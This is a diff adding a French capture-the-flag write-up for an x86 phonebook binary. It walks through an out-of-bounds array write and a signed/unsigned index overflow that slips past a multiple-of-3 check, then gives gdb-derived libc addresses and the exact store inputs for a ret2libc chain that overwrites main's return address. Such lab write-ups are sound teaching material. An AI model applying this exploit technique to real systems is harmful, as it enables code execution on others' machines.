@@ -9,7 +9,78 @@
 |    |    |
 | :- | :- |
 | **Architecture** | x86 |
-| **Exploit type** |  |
+| **Exploit type** | buffer overflow |
 
 On arrive sur un programme qui ressemble au phonebook des modules CPP.\
+En décompilant on peut trouver les fonctions `store_number` et `read_number`.
 
+Quand on entre la commande read dans le programme avec un grand nombre, il segfault.\
+Dans le code, on voit un accès à la mémoire relatif à une position dans la stack, dans laquelle on peut écrire et lire.
+```c
+data[index]
+```
+On peut choisir l'index de notre choix (et donc dépasser).
+
+Data est initialisé avec un tableau de 100, donc au dessus, on sort de l'espace prévu.
+
+Mais pour la partie écriture, il faut que cet index ne soit pas un multiple de 3, et que le nombre à enregistrer ne commence pas par 0xb7 (183).
+
+On peut rapidement se dire qu'il faudra faire un `ret2libc`, donc on peut déjà chercher `/bin/sh` et les fonctions `system` et `exit` :
+```gdb
+(gdb) p system
+0xf7e6aed0
+(gdb) p exit
+0xf7e5eb70
+(gdb) find __libc_start_main,+99999999,"/bin/sh"
+0xf7f897ec
+```
+
+Ainsi que l'adresse de retour de `main`, qui se situe à `0xffffd71c` (4294956828).\
+On va maintenant calculer l'index nécessaire :\
+Le pointeur de la data est à `esp - 0x24`, à `0xffffd554` (4294956372), donc une différence de `456`.
+En index de type `int`, cela donne `456 / 4 = 114`.
+
+Et problème, c'est un multiple de 3, donc on ne pourra pas y écrire...
+
+On peut déjà vérifier si on arrive à écrire notre `ret2libc` pour la partie exit et /bin/sh :
+```
+Input command: store
+ Number: 4159040368
+ Index: 115
+ Completed store command successfully
+Input command: store
+ Number: 4160264172
+ Index: 116
+ Completed store command successfully
+```
+4159040368 = `0xf7e5eb70`
+4160264172 = `0xf7f897ec`
+
+Et en regardant dans la stack, on a bien le résultat souhaité :
+```
+(gdb) x/3wx $ebp+4
+0xffffd71c:	0xf7e45513	0xf7e5eb70	0xf7f897ec
+```
+
+Mais il y a toujours ce premier nombre à modifier.\
+Après un peu de temps à réfléchir, on remarque que les fonctions prennent un `int`, alors qu'on demande un `unsigned int` à l'utilisateur !
+
+Le int max est `2147483647` (2^31 - 1). En ajoutant 1 pour l'overflow, et 114, on obtient `2147483647 + 1 + 114 = 2147483762`.\
+Et ce n'est pas un multiple de 3 !
+
+Voici donc le résultat final :
+```plaintext
+Input command: store
+ Number: 4159090384
+ Index: 2147483762
+ Completed store command successfully
+Input command: store
+ Number: 4159040368
+ Index: 115
+ Completed store command successfully
+Input command: store
+ Number: 4160264172
+ Index: 116
+ Completed store command successfully
+Input command: quit
+```
